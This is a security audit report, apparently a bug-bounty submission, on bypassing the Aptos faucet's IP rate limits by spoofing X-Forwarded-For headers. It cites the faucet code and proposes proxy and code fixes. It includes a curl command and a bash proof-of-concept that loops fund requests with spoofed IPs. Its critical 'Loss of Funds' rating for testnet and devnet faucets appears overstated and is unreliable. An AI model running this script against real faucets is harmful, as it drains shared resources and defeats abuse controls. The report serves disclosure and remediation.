# Audit Report

## Title
Complete Rate Limit Bypass via HTTP Header Spoofing in Aptos Faucet

## Summary
The Aptos faucet's rate limiting mechanism can be completely bypassed by attackers through HTTP header manipulation. The faucet uses the `RealIp` extractor from the Poem framework to determine client IP addresses, which blindly trusts client-provided headers like `X-Forwarded-For` and `X-Real-IP`. Since the faucet is designed to run without a reverse proxy, attackers can trivially spoof these headers to present false IP addresses, bypassing all IP-based rate limits and security controls.

## Finding Description

The vulnerability exists in the IP extraction flow used by the faucet's rate limiting system:

1. **IP Extraction**: The faucet endpoints use `RealIp` from the Poem framework to extract the source IP address [1](#0-0) 

2. **Header Trust**: The `RealIp` extractor checks HTTP headers in order: `X-Forwarded-For`, `X-Real-IP`, and `Forwarded` to determine the client's IP. The code comments explicitly document this behavior [2](#0-1) 

3. **No Proxy Deployment**: The faucet is explicitly designed to run without a reverse proxy. The README states: "Built in rate limiting, e.g. with a Redis backend, eliminating the need for something like haproxy in front of the faucet" [3](#0-2) 

4. **Direct Usage in Rate Limiting**: The extracted IP is unwrapped and used directly to construct `CheckerData` [4](#0-3) 

5. **Rate Limit Application**: The `MemoryRatelimitChecker` (and similarly `RedisRatelimitChecker`) uses this `source_ip` directly for rate limiting decisions [5](#0-4) 

**Attack Path:**
1. Attacker sends HTTP POST request to `/fund` endpoint with spoofed header: `X-Forwarded-For: 192.0.2.1`
2. `RealIp::from_request` reads this header and returns `192.0.2.1` as the source IP
3. `CheckerData` is created with the spoofed IP at line 239
4. `MemoryRatelimitChecker.check()` checks/increments the rate limit counter for `192.0.2.1`
5. Attacker makes subsequent requests with different spoofed IPs (e.g., `192.0.2.2`, `192.0.2.3`, etc.)
6. Each spoofed IP gets its own rate limit counter, effectively bypassing all rate limits
7. Attacker can drain the faucet by making unlimited fund requests

**Security Guarantees Broken:**
- **Rate Limiting Invariant**: The faucet's maximum requests per day per IP is completely bypassed
- **Resource Protection**: Faucet funds can be drained without limitation
- **IP Blocklist**: IP blocklists are also bypassed using the same `source_ip` field [6](#0-5) 

## Impact Explanation

**Severity: CRITICAL (up to $1,000,000)**

This vulnerability meets the Aptos Bug Bounty **Critical Severity** criteria for **"Loss of Funds"**:

1. **Complete Rate Limit Bypass**: All IP-based rate limiting mechanisms (`MemoryRatelimitChecker`, `RedisRatelimitChecker`) can be trivially bypassed, allowing unlimited fund requests.

2. **Faucet Drainage**: An attacker can drain the entire faucet balance by making unlimited requests with different spoofed IP addresses. Each request can mint/transfer the maximum configured amount.

3. **Scale of Impact**: Affects all production faucet deployments on testnets and devnets, which typically fund user accounts for development and testing.

4. **No Privileged Access Required**: Any unprivileged HTTP client can exploit this vulnerability - no validator access, keys, or special permissions needed.

5. **Affects Multiple Security Controls**: Beyond rate limiting, this also bypasses:
   - IP blocklists (if configured)
   - IP allowlists (can claim bypass privileges)
   - Any other IP-based security mechanisms

The faucet service configuration shows no trusted proxy settings or IP validation mechanisms [7](#0-6) 

## Likelihood Explanation

**Likelihood: VERY HIGH**

1. **Trivial Exploitation**: Spoofing HTTP headers is trivial and requires no specialized tools:
   ```bash
   curl -X POST http://faucet.example.com/fund \
     -H "X-Forwarded-For: 1.2.3.4" \
     -H "Content-Type: application/json" \
     -d '{"address":"0x1234..."}'
   ```

2. **No Authentication Required**: The faucet endpoints are publicly accessible by design - no authentication barriers to overcome.

3. **Direct Exposure**: The faucet is explicitly deployed without a reverse proxy, making it directly vulnerable to this attack vector.

4. **Known Attack Vector**: HTTP header spoofing for rate limit bypass is a well-known attack pattern, likely to be discovered by attackers.

5. **No Defense Mechanisms**: The codebase contains no IP validation, trusted proxy configuration, or header sanitization that would mitigate this vulnerability.

## Recommendation

**Immediate Mitigations:**

1. **Deploy Behind Trusted Reverse Proxy**: Place the faucet behind a properly configured reverse proxy (HAProxy, nginx) that:
   - Strips all client-provided forwarding headers
   - Sets trusted forwarding headers based on the actual client socket address
   - Example HAProxy configuration:
     ```
     http-request del-header X-Forwarded-For
     http-request del-header X-Real-IP
     http-request del-header Forwarded
     http-request set-header X-Forwarded-For %[src]
     ```

2. **Use Direct Socket Address**: Modify the faucet to extract IP from the actual TCP connection instead of trusting HTTP headers. The Poem framework provides access to the peer address through the connection metadata.

**Long-term Solution:**

Implement a trusted proxy configuration system in the faucet:

```rust
// In server_args.rs
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct ServerConfig {
    pub listen_address: String,
    pub listen_port: u16,
    pub api_path_base: String,
    
    /// List of trusted proxy IP addresses/ranges
    /// If empty, use direct connection IP only
    #[serde(default)]
    pub trusted_proxies: Vec<String>,
    
    /// If true, trust X-Forwarded-For only from trusted_proxies
    #[serde(default)]
    pub use_forwarded_headers: bool,
}

// In fund.rs - modify preprocess_request
let source_ip = if config.use_forwarded_headers && is_from_trusted_proxy(peer_addr, &config.trusted_proxies) {
    match source_ip.0 {
        Some(ip) => ip,
        None => peer_addr, // fallback to direct connection
    }
} else {
    peer_addr // Always use direct connection IP if not from trusted proxy
};
```

## Proof of Concept

**Attack Script:**

```bash
#!/bin/bash
# PoC: Bypass faucet rate limits via IP spoofing

FAUCET_URL="http://faucet-testnet.example.com"
TARGET_ADDRESS="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

# Make 100 requests with different spoofed IPs
# Each bypasses the rate limit by presenting a "new" IP
for i in {1..100}; do
    SPOOFED_IP="192.0.2.$i"
    echo "Request $i with spoofed IP: $SPOOFED_IP"
    
    curl -X POST "$FAUCET_URL/fund" \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: $SPOOFED_IP" \
      -d "{\"address\":\"$TARGET_ADDRESS\",\"amount\":1000000}" \
      -w "\nStatus: %{http_code}\n\n"
    
    # No rate limiting triggered because each request appears from different IP
done

echo "Successfully bypassed rate limit with 100 requests from 'different' IPs"
```

**Expected Result**: All 100 requests succeed, despite rate limiting configuration (e.g., max 5 requests per day per IP), because each request presents a different spoofed source IP to the rate limiter.

**Verification**: Check the faucet's rate limit storage (memory or Redis) - it will show 100 different IP addresses, each with only 1 request, rather than 100 requests from the actual attacker's IP.

## Notes

This vulnerability is particularly severe because:

1. **Design Philosophy**: The faucet was intentionally designed to run without a reverse proxy, making this vulnerability a fundamental architectural issue rather than a deployment misconfiguration.

2. **Multiple Attack Vectors**: The same spoofed IP is used throughout the faucet's security stack, affecting rate limiting, IP blocklists, IP allowlists, and logging.

3. **Production Impact**: This affects all publicly accessible Aptos faucets on testnets and devnets, which are critical infrastructure for developer onboarding and testing.

4. **Stealth Attacks**: An attacker could slowly drain the faucet over time using different spoofed IPs, making detection difficult through normal rate limit monitoring.

The fix requires either mandatory reverse proxy deployment with proper configuration documentation, or implementing trusted proxy support directly in the faucet service with secure defaults (i.e., no header trust unless explicitly configured).

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-242)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };

        let receiver = match fund_request.receiver() {
            Some(receiver) => receiver,
            None => {
                return Err(AptosTapError::new(
                    "Account address, auth key, or pub key must be provided and valid".to_string(),
                    AptosTapErrorCode::InvalidRequest,
                ))
            },
        };

        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/README.md (L23-23)
```markdown
- Built in rate limiting, e.g. with a [Redis](https://redis.io/) backend, eliminating the need for something like haproxy in front of the faucet. These are also just checkers.
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L77-88)
```rust
        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/checkers/mod.rs (L151-151)
```rust
    pub source_ip: IpAddr,
```

**File:** crates/aptos-faucet/core/src/server/server_args.rs (L6-19)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct ServerConfig {
    /// What address to listen on, e.g. localhost / 0.0.0.0
    #[serde(default = "ServerConfig::default_listen_address")]
    pub listen_address: String,

    /// What port to listen on.
    #[serde(default = "ServerConfig::default_listen_port")]
    pub listen_port: u16,

    /// API path base. e.g. "/v1"
    #[serde(default = "ServerConfig::default_api_path_base")]
    pub api_path_base: String,
}
```
